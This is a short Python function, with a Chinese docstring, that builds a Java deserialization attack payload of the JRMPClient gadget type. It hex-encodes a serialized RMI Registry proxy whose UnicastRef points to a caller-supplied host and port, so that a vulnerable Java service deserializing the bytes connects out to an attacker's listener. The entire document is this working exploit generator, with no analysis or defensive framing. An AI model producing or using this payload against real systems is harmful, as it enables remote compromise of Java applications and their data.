def jrmpclient(hostname: str, port: int) -> bytes:
    """
    输入hostname和port，例如127.0.0.1和789
    """
    prefix = "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e030000787077"
    midfix = "000a556e696361737452656600"
    postfix = "ffffffffe8e5fcc900000000000000000000000000000078"
    host = hostname.encode().hex() + port.to_bytes(4, byteorder="big").hex()
    length = (len(midfix + host + postfix) // 2).to_bytes(1, byteorder="big").hex()
    length2 = (len(hostname)).to_bytes(1, byteorder="big").hex()
    hexdata = prefix + length + midfix + length2 + host + postfix
    data = bytes.fromhex(hexdata)
    return data
